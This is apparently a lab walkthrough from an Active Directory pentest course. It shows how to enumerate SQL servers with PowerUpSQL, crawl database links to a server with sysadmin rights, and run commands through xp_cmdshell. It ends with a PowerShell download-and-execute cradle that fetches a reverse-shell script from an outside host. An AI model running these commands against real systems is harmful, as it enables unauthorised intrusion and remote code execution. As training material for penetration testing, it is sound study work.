# 🔗 Reverse shell on a SQL server by abusing database links

Let's start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using Invisi-Shell:

```
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

<figure><img src="../../.gitbook/assets/image (1167).png" alt=""><figcaption></figcaption></figure>

Now that we have those informations, we can use Get-SQLServerLinkCrawl for crawling the database links automatically:

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We can see We have sysadmin on eu-sql server!

<figure><img src="../../.gitbook/assets/image (1168).png" alt=""><figcaption></figcaption></figure>

If xp\_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener:

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.13:9898/Invoke-PowerShellTcpEx.ps1'')"' -QueryTarget eu-sql
```

